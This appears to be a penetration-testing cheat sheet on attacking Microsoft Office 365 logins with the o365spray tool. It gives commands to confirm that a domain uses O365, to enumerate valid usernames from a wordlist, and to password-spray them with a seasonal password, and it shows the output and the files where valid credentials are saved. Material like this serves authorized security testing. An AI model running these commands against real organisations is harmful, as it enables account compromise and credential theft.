Cloud providers implement custom authentication mechanisms that may expose features such as **username enumeration** and **password spraying vectors**. Microsoft Office 365 (O365) is a common target in enterprise environments.

---

## 1. Detecting Office 365 Usage

Before enumeration, validate whether the target domain uses O365 with [o365spray](https://github.com/0xZDH/o365spray).

```bash
python3 o365spray.py --validate --domain <domain>
```

If valid:

```
[VALID] The following domain is using O365
```

This confirms Azure AD / O365 authentication endpoints are in use.

---

## 2. Username Enumeration (O365)

O365spray supports username enumeration via different modules (e.g., office, oauth2).

```bash
python3 o365spray.py --enum -U users.txt --domain <domain>
```

Key parameters:

- `--enum` → Enable enumeration
    
- `-U` → Username wordlist
    
- `--domain` → Target domain
    

Output:

```
[VALID] user@domain.com
```

Valid accounts are written to:

```
/opt/o365spray/enum/enum_valid_accounts.*
```

---
## 3. Password Spraying Against O365

Use O365spray for controlled password spraying via OAuth2 or Office modules.

```bash
python3 o365spray.py \
  --spray \
  -U usersfound.txt \
  -p 'Spring2024!' \
  --count 1 \
  --lockout 1 \
  --domain <domain>
```

Important options:

- `--spray` → Enable spraying
    
- `-U` → Valid usernames
    
- `-p` → Password to test
    
- `--count 1` → One password per spray round
    
- `--lockout` → Delay between sprays (minutes)
    

Successful authentication:

```
[VALID] user@domain.com:Password
```

Credentials saved to:

```
/opt/o365spray/spray/spray_valid_credentials.*
```
